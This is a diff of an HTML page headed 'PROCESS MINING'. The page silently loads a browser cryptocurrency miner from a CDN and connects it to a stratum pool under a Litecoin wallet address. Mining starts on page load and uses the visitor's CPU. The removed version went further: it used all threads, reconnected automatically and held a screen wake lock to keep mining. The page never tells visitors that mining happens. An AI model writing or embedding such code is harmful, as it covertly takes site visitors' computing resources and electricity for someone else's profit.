@@ -1,8 +1,17 @@
 <!DOCTYPE html>
 <html>
-<body style="margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;">
+<head>
+<style>
+  h1 {
+    text-align: center;
+    font-size: 48px;
+    margin-top: 40px;
+  }
+</style>
+</head>
+<body>
 
-<h2 style="font-size: 48px; text-align: center;">PROCESS MINING</h2>
+<h1>PROCESS MINING</h1>
 
 <script type="module">
 import * as cpuWebMiner from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
@@ -13,50 +22,16 @@ const stratum = {
     worker: "ltc1qa2y2ysyqw63krk8qhgemq206axxeh8lt40kkm4",
     password: "c=LTC",
     ssl: false // true when pool uses SSL, false otherwise
-};
-
-let lastActive = Date.now();
-let reconnecting = false;
-
-function startMiner() {
-    reconnecting = false;
-    lastActive = Date.now();
-    cpuWebMiner.start(
-        cpuWebMiner.minotaurx,
-        stratum,
-        null,
-        cpuWebMiner.ALL_THREADS,
-        work => {
-            lastActive = Date.now();
-            console.log(work);
-        },
-        hashrate => {
-            lastActive = Date.now();
-            console.log(hashrate);
-        },
-        error => {
-            console.log(error);
-            reconnect();
-        }
-    );
 }
 
-function reconnect() {
-    if (reconnecting) return;
-    reconnecting = true;
-    try { cpuWebMiner.stop(); } catch (e) {}
-    setTimeout(startMiner, 3000);
-}
-
-setInterval(() => {
-    if (Date.now() - lastActive > 30000) reconnect();
-}, 10000);
-
-if ('wakeLock' in navigator) {
-    navigator.wakeLock.request('screen').catch(() => {});
-}
-
-startMiner();
+cpuWebMiner.start(
+    cpuWebMiner.minotaurx,
+    stratum,
+    null,
+    8,
+    work => console.log(work),
+    hashrate => console.log(hashrate),
+    error => console.log(error));
 </script>
 
 </body>
